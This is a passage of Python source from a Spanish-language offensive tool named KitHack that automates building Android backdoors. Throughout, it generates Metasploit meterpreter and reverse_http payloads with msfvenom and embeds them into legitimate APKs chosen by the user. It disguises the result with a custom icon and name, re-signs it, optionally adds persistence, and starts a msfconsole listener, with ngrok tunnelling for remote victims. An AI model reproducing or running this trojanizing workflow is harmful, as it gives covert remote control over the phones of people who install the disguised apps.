							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
					
					elif a == '02':
						print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
						print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
						print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

						m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
						m = m.zfill(2)
						
						if m == '01':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
							location = os.getcwd()
							if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	

						elif m == '02':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
							location = os.getcwd()
							print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
							print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)				
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/original -o output/kithack.apk')
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()			

						else:
							print("{}\n[X] OPCION INVALIDA\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('clear')
							main()	

					else:
						print("\n{}[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

			elif pay == '04':
					print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
					print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
					
					a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					a = a.zfill(2)
					
					if a == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
							break
						else:
							Tk().withdraw()
							icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
							print("\n{0}ICON: {1}".format(YELLOW, icon))						
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))												
							mainout = os.path.splitext(OUT)[0]	
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							file = open("/tmp/data.txt", "w")
							file.write(icon + '\n')
							file.write(mainout)
							file.close()
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
							print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
							time.sleep(4)						
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/payload -o output/kithack.apk')
							location = os.getcwd()
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()

						# Salida de bucle
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break						
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
					
					elif a == '02':
						print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
						print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
						print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

						m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
						m = m.zfill(2)
						
						if m == '01':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
							location = os.getcwd()
							if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	

						elif m == '02':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
							location = os.getcwd()
							print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
							print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)				
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/original -o output/kithack.apk')
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()			

						else:
							print("{}\n[X] OPCION INVALIDA\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('clear')
							main()	

					else:
						print("\n{}[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()

			elif pay == '05':
					print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
					print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
					
					a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					a = a.zfill(2)
					
					if a == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
							break
						else:
							Tk().withdraw()
							icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
							print("\n{0}ICON: {1}".format(YELLOW, icon))						
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))												
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
							file = open("/tmp/data.txt", "w")
							file.write(icon + '\n')
							file.write(mainout)
							file.close()
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
							print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
							time.sleep(4)						
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/payload -o output/kithack.apk')
							location = os.getcwd()
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()

						# Salida de bucle
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break						
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
					
					elif a == '02':
						print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
						print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
						print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

						m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
						m = m.zfill(2)

						if m == '01':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
